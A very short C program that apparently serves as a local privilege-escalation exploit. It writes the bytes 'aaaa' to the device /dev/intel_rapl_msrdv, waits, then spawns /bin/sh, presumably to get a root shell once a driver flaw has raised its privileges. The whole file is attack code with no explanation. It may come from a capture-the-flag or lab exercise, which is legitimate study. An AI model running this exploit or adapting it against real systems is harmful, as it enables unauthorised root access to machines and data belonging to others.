#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main() {
	int fd = open("/dev/intel_rapl_msrdv",O_RDWR);
	write(fd,"aaaa",4);
	sleep(2);
	system("/bin/sh");
}
